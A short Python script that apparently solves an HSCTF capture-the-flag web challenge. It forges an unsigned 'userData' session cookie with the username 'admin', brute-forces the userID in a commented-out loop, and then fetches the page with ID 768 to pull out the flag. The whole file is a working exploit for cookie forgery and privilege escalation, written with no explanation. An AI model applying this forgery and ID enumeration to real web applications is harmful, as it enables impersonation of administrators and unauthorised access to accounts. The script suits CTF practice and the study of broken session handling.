#!/usr/bin/python3

import re
import urllib.parse

import requests

url = "https://message-board.hsc.tf/"

val = 1
cookies = f"userData=j%3A%7B%22userID%22%3A%22{val}%22%2C%22username%22%3A%22kupatergent%22%7D"

#s = requests.Session()
# s.post(url + "login", data={"username" : "kupatergent", "password" : "gandal"})

# cookies = str(s.cookies)
# cookies = cookies.split()[1]
# print(cookies)

#cookies = urllib.parse.quote(cookies)
#print(cookies)
#cookies = cookies.replace("kupatergent", "admin")

#cookies = urllib.parse.unquote(cookies)
#print(cookies[9:])


# for i in range(999, 100, -1):
# 	print(i)
# 	cookies = {"userData" : f"j%3A%7B%22userID%22%3A%22{i}%22%2C%22username%22%3A%22admin%22%7D"}
# 	r = requests.get(url, cookies=cookies)
# 	print(re.findall("HSCTF.*", r.text)[0])
	#break
#print(r.text)


i = 768
cookies = {"userData" : f"j%3A%7B%22userID%22%3A%22{i}%22%2C%22username%22%3A%22admin%22%7D"}
r = requests.get(url, cookies=cookies)
print(re.findall("flag{.*}", r.text)[0])